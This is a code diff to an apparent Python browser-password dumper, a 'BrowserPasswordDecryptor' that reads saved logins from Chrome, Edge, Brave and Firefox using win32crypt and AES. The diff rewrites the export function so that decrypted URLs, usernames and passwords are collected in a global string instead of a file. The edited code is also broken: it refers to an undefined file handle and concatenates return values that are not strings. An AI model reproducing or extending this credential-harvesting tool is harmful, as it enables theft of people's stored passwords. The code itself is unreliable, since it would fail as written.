@@ -14,6 +14,7 @@ from Cryptodome.Cipher import AES
 from colorama import Fore, Style
 import win32crypt
 
+output = ''
 colorama.init(autoreset=True)
 
 class BrowserPasswordDecryptor:
@@ -172,24 +173,23 @@ class BrowserPasswordDecryptor:
         return results
 
 def export_passwords(passwords: Dict, format: str = 'csv', output_file: str = 'passwords.csv'):
+    global output
     if format == 'csv':
-        with open(output_file, 'w', newline='', encoding='utf-8') as f:
-            writer = csv.DictWriter(f, fieldnames=['browser', 'profile', 'url', 'username', 'password'])
-            writer.writeheader()
-            for browser, profiles in passwords.items():
-                for profile, creds in profiles.items():
-                    for cred in creds:
-                        writer.writerow({
-                            'browser': browser,
-                            'profile': profile,
-                            **cred
-                        })
+        writer = csv.DictWriter(f, fieldnames=['browser', 'profile', 'url', 'username', 'password'])
+        output += writer.writeheader()
+        for browser, profiles in passwords.items():
+            for profile, creds in profiles.items():
+                for cred in creds:
+                    output += writer.writerow({
+                        'browser': browser,
+                        'profile': profile,
+                        **cred
+                    })
     else:
-        with open(output_file.replace('.csv', '.json'), 'w', encoding='utf-8') as f:
-            json.dump(passwords, f, indent=2)
+        output += json.dump(passwords, f, indent=2)
 
 def main():
-    output = ''
+    global output
     parser = argparse.ArgumentParser(description='Multi-browser password decryptor')
     parser.add_argument('-b', '--browsers', nargs='+', default=['chrome'],
                        choices=['chrome', 'edge', 'brave', 'firefox'])
